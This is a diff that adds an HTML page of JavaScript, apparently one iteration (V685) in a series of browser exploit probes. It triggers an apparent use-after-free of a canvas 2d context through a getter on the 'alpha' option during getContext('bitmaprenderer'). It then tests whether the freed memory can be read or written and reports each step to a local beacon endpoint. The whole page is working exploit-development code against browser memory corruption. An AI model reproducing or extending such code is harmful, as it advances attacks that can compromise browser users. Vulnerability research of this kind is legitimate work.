@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V685 ordered probe</title></head>
+<body><pre id="out">V685 — is the freed chunk readable? writable? where does it die?</pre>
+<script>
+/* V685: V684 `probe` died before its first OSTEP while `whoami` worked, so
+ * the trigger itself is innocent; the fault is in the first touch of the
+ * dangling wrapper.  But V684 sent OPRE *before* the trigger, so the fault
+ * could have been anywhere in between.
+ *
+ * V685 fixes the ordering and the order of the touches:
+ *   OSTEP0  immediately after getContext('bitmaprenderer') returns
+ *   OSTEP1  getContextAttributes()   -> pure byte read of m_settings
+ *   OSTEP2  savedCtx.canvas === canvas -> pointer load of m_canvas
+ *   OSTEP3  save()                   -> pure write of m_unrealizedSaveCount
+ *   OSTEP4  restore()
+ *
+ * Reading is tested before writing, so a read-only-possible chunk is not
+ * masked by the write test.  Every step has its own synchronous beacon.
+ *
+ * Modes: op=probe2 | op=reset
+ * Params: op, once=1, reset=1
+ */
+'use strict';
+var PARAM = {};
+try {
+  var qs = location.search.replace(/^\?/, '');
+  var parts = qs.split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var MODE = PARAM.op || 'probe2';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function st() {
+  try { if (window.localStorage) return window.localStorage; } catch (e) {}
+  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
+  return null;
+}
+var ST = st();
+function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
+function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }
+
+function bk(tag, body) {
+  var u = '/beacon/V685-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now();
+  try { new Image().src = u; } catch (e) {}
+}
+function bks(tag, body) {
+  var u = '/beacon/V685-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+function clearOnce() {
+  var n = 0, pref = ['v683c_', 'v684c_', 'v685c_'];
+  try {
+    var keys = [];
+    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
+    for (var j = 0; j < keys.length; j++) {
+      for (var p = 0; p < pref.length; p++) {
+        if (keys[j] && keys[j].indexOf(pref[p]) === 0) { ST.removeItem(keys[j]); n++; break; }
+      }
+    }
+  } catch (e) {}
+  return n;
+}
+
+if (MODE === 'reset' || PARAM.reset === '1') {
+  var cn = clearOnce();
+  bks('ORESET', 'cleared=1,once=' + cn);
+  say('v683/v684/v685 guards cleared. Reload the index.');
+}
+if (MODE !== 'reset') {
+  var onceKey = 'v685c_' + MODE;
+  var once = PARAM.once === '1';
+  var blocked = false;
+  if (once) {
+    if (stGet(onceKey) === '1') blocked = true;
+    else stSet(onceKey, '1');
+  }
+
+  if (blocked) {
+    bks('OBLOCK', 'op=' + MODE);
+    say('BLOCKED by once=1 for op=' + MODE + ' (tap RESET)');
+  } else {
+    setTimeout(function () { bk('OLATE', 'op=' + MODE + ',alive=1'); }, 1500);
+
+    bks('OBOOT', 'op=' + MODE + ',once=' + (once ? 1 : 0));
+
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    document.body.appendChild(canvas);
+    window._v685canvas = canvas;
+
+    var savedCtx = null;
+    var dict = {};
+    Object.defineProperty(dict, 'alpha', {
+      get: function () {
+        var ctx = canvas.getContext('2d');
+        if (!ctx) return true;
+        savedCtx = ctx;
+        window._v685ctx = ctx;
+        try { ctx.lineWidth = 3.14159; } catch (eI) {}
+        return true;
+      }
+    });
+
+    bks('OPRE', 'op=' + MODE);            /* context still ALIVE here */
+
+    var bmpCtx = null, terr = '';
+    try { bmpCtx = canvas.getContext('bitmaprenderer', dict); }
+    catch (eJ) { terr = eJ.name || 'err'; }
+
+    /* the trigger has returned: proved to be innocent by whoami */
+    bks('OSTEP0', 'op=' + MODE + ',bmp=' + (bmpCtx ? 1 : 0) + ',inner=' + (savedCtx ? 1 : 0));
+
+    if (!savedCtx) {
+      bks('OFAIL', 'no-inner');
+      say('ABORT: inner context missing');
+    } else if (!bmpCtx) {
+      bks('OFAIL', 'no-bmr:' + terr);
+      say('ABORT: bitmaprenderer failed ' + terr);
+    } else if (MODE === 'probe2') {
+      /* ---- 1: pure byte read of m_settings (no pointer deref) ---- */
+      var s1 = '', at = null;
+      try {
+        at = savedCtx.getContextAttributes();
+        s1 = 'alpha=' + (at && at.alpha) + ',wrf=' + (at && at.willReadFrequently) +
+             ',desync=' + (at && at.desynchronized) + ',cs=' + (at && at.colorSpace);
+      } catch (e1) { s1 = 'E!' + (e1.name || 'err'); }
+      bks('OSTEP1', 'op=probe2,attr=' + s1);
+      say('attrs -> ' + s1);
+
+      /* ---- 2: pointer load of m_canvas ---- */
+      var s2 = '';
+      try { s2 = 'self=' + ((savedCtx.canvas === canvas) ? 1 : 0); }
+      catch (e2) { s2 = 'E!' + (e2.name || 'err'); }
+      bks('OSTEP2', 'op=probe2,canvas=' + s2);
+      say('canvas -> ' + s2);
+
+      /* ---- 3: pure write of m_unrealizedSaveCount ---- */
+      var s3 = 'ok';
+      try { savedCtx.save(); } catch (e3) { s3 = 'E!' + (e3.name || 'err'); }
+      bks('OSTEP3', 'op=probe2,save=' + s3);
+      say('save -> ' + s3);
+
+      var s4 = 'ok';
+      try { savedCtx.restore(); } catch (e4) { s4 = 'E!' + (e4.name || 'err'); }
+      bks('OSTEP4', 'op=probe2,restore=' + s4);
+      say('restore -> ' + s4);
+
+    } else {
+      bks('OFAIL', 'unknown-op=' + MODE);
+      say('unknown op ' + MODE);
+    }
+  }
+}
+</script>
+</body></html>
